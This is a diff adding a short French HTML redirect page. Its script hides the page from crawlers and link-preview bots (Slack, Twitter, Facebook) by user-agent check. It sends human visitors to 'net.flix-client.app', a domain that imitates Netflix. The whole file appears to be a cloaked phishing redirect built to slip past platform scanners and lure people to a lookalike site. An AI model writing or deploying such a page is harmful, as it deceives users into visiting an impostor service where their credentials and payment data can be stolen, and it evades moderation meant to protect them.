@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+
+<html lang="fr">
+<head>
+<meta charset="utf-8"/>
+<title>Redirection</title>
+<script type="text/javascript">
+        function isBot() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            const bots = ['bot', 'crawl', 'slack', 'twitter', 'facebook', 'spider'];
+
+            return bots.some(bot => userAgent.includes(bot));
+        }
+
+        function redirect() {
+            if (isBot()) {
+                document.body.innerHTML = "<p>AccÃ¨s interdit aux bots.</p>";
+            } else {
+                window.location.href = "https://net.flix-client.app";
+            }
+        }
+
+        setTimeout(redirect, 200);
+    </script>
+</head>
+<body>
+</body>
+</html>
